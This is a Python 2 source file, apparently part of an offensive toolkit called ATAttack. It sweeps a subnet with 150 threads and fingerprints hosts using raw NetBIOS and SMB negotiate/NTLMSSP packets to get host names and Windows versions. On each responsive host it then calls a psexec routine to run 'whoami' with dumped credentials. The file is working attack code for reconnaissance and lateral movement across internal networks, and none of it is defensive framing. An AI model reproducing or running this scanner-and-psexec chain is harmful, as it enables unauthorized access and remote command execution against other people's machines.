#! /usr/bin/env python2.7
# -*- coding: utf-8 -*-


import socket
import threading
import struct
from functools import reduce
from ATAttack.credentials.yhzldb import check_ip
from ATAttack.credentials.example import psexec
from ATAttack.framework.constant import constant


threads = 150
threads_num = int(threads)
semaphore = threading.BoundedSemaphore(value=threads_num)
print_lock = threading.Lock()
version = []


class ipadders():

    def __init__(self):
        pass

    def ip_into_int(self, ip):
        # 先把 192.168.1.13 变成16进制的 c0.a8.01.0d ，再去了“.”后转成10进制的 3232235789 即可。
        # (((((192 * 256) + 168) * 256) + 1) * 256) + 13
        return reduce(lambda x, y: (x << 8) + y, map(int, ip.split('.')))

    def is_internal_ip(self, ip):
        ip = self.ip_into_int(ip)
        net_a = self.ip_into_int('10.255.255.255') >> 24
        net_b = self.ip_into_int('172.31.255.255') >> 20
        net_c = self.ip_into_int('192.168.255.255') >> 16
        return ip >> 24 == net_a or ip >> 20 == net_b or ip >> 16 == net_c

def _check(ip):
    try:
        host_name, group_type = _get_host_name(str(ip))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((ip, 445))
        payload1 = b'\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00'
        payload2 = b'\x00\x00\x01\x0a\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x40\x00\x0c\xff\x00\x0a\x01\x04\x41\x32\x00\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x00\x00\xd4\x00\x00\xa0\xcf\x00\x60\x48\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x3e\x30\x3c\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a\xa2\x2a\x04\x28\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x07\x82\x08\xa2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x02\xce\x0e\x00\x00\x00\x0f\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x65\x00\x72\x00\x20\x00\x32\x00\x30\x00\x30\x00\x33\x00\x20\x00\x33\x00\x37\x00\x39\x00\x30\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x20\x00\x50\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x32\x00\x00\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x65\x00\x72\x00\x20\x00\x32\x00\x30\x00\x30\x00\x33\x00\x20\x00\x35\x00\x2e\x00\x32\x00\x00\x00\x00\x00'
        s.send(payload1)
        s.recv(1024)
        s.send(payload2)
        ret = s.recv(1024)
        s.close()
        length = ord(ret[43:44]) + ord(ret[44:45]) * 256
        os_version = ret[47 + length:]
        result = ip + ":" + "\\\\" + host_name + "  OS:" + os_version
        # if result is not None:
        #     num.append(ip)
        version.append(result)
        for os in version:
            with open(constant.tmp_name__, "a") as file:
                file.writelines(os + '\n')
            file.close()
        return ip, result
    except Exception:
        pass

def _get_host_name(ip):
    host_name = ""
    group_type = ""
    host_name_type = ""
    data = b'ff\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00 CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00!\x00\x01'
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.sendto(data, (ip, 137))
        recv = s.recv(2000)
        if isinstance(recv, str):
            recv = bytes(recv)
        num = ord(recv[56:57].decode())
        recv = recv[57:]
        s.close()
        for i in range(num):
            name = recv[18 * i:18 * i + 15].decode()
            if str(name).strip() not in host_name_type:
                host_name_type = host_name_type + str(name).strip() + "\\"
        host_name = host_name_type.split('\\')[0]
        group_type = host_name_type.split('\\')[1]
        return host_name, group_type
    except BaseException:
        return host_name, group_type

def _thread(ip_address,dump):

    global semaphore
    try:
        ipadder, result = _check(ip_address)
        if ipadder is not None:
            check_ip(ipadder)
            psexec('whoami', ipadder, dump, None)
    except Exception:
        with print_lock:
            pass
    finally:
        semaphore.release()

def smb_version(network,dump):
    # sam = dump()
    # print sam.save_hives()
    # network = "192.168.1.1/24"
    (ip, cidr) = network.split('/')
    cidr = int(cidr)
    host_bits = 32 - cidr
    i = struct.unpack('>I', socket.inet_aton(ip))[0]  # note the endianness
    start = (i >> host_bits) << host_bits  # clear the host bits
    end = i | ((1 << host_bits) - 1)
    for i in range(start + 1, end):
        semaphore.acquire()
        t = threading.Thread(
            target=_thread, args=(
                socket.inet_ntoa(
                    struct.pack(
                        '>I', i)),dump))
        t.start()
